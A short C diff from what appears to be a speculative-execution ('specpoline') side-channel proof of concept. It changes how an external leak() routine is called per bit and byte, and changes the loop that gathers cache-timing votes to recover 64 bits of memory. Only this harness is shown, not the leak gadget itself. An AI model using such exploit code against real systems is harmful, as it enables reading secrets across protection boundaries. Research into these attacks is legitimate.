@@ -8,7 +8,7 @@
 
 
 extern unsigned int timings[256];
-extern void leak(unsigned int off);
+extern void leak(unsigned int bit, unsigned int byte);
 
 void vote(unsigned int* vote0, unsigned int* vote1)
 {
@@ -30,19 +30,18 @@ void vote(unsigned int* vote0, unsigned int* vote1)
 
 int main()
 {
-    unsigned int i = 0, bit;
+    unsigned int bit;
     unsigned long long base=0;
     unsigned int votes0, votes1;
 
     for (bit = 0; bit < 64; bit++)
     {
         votes0 = votes1 = 0;
-        i = 0;
         
         /* Test specpoline */
-        while (i++ < 100)
+        while (votes0 + votes1 < 30)
         {    
-          leak(bit);
+          leak(bit % 8, 2 + bit / 8);
           vote(&votes0, &votes1);
         }
 
